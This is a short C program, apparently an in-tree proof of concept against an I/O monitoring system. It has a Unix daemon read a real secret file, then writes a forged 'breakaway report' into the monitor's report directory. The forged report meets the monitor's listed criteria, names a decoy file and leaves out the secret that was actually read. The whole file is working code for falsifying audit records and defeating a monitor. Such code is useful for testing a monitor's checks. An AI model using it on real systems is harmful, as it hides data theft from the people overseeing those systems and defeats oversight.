/* Upgraded in-tree forgery defeating ALL post-R-A (R8) auth criteria:
 *  1. client pid = self (monitored)         2. run = REPRO_MONITOR_SESSION (read from env)
 *  3. connection observed (we really connect) 4. no nonce supplied (optional)
 *  5. declares `complete` + lists a DECOY read -- OMITTING the real served file. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
int main(int argc,char**argv){
  if(argc<3){fprintf(stderr,"usage: fc <sock> <real-secret-file>\n");return 2;}
  int s=socket(AF_UNIX,SOCK_STREAM,0);
  struct sockaddr_un a; memset(&a,0,sizeof a); a.sun_family=AF_UNIX;
  strncpy(a.sun_path,argv[1],sizeof(a.sun_path)-1);
  if(connect(s,(struct sockaddr*)&a,sizeof a)<0){perror("connect");return 1;}
  pid_t peer=0; socklen_t pl=sizeof peer;
  getsockopt(s,SOL_LOCAL,LOCAL_PEERPID,&peer,&pl);
  dprintf(s,"%s\n",argv[2]);                 /* daemon reads the REAL secret */
  char buf[8192]; ssize_t n; size_t tot=0;
  while((n=read(s,buf,sizeof buf))>0) tot+=n;
  close(s);
  const char*dir=getenv("IO_MON_BREAKAWAY_REPORT_DIR");
  const char*run=getenv("REPRO_MONITOR_SESSION");
  if(dir&&dir[0]){
    char rp[8192];
    snprintf(rp,sizeof rp,"%s/forged-%d.io-mon-report",dir,(int)getpid());
    FILE*r=fopen(rp,"w");
    if(r){
      fprintf(r,"io-mon-breakaway-report v1\n");
      if(run&&run[0]) fprintf(r,"run %s\n",run);     /* criterion 2 */
      fprintf(r,"client %d\n",(int)getpid());        /* criterion 1 */
      fprintf(r,"daemon %d\n",(int)peer);            /* criterion 3 */
      fprintf(r,"read /tmp/r3_residual/res4_forge/DECOY.txt\n"); /* criterion 5: bogus */
      fprintf(r,"complete\n");                        /* criterion 5 */
      fclose(r);
    }
  }
  printf("FORGER got %zu bytes; real secret %s OMITTED from report (decoy substituted)\n",tot,argv[2]);
  return 0;
}
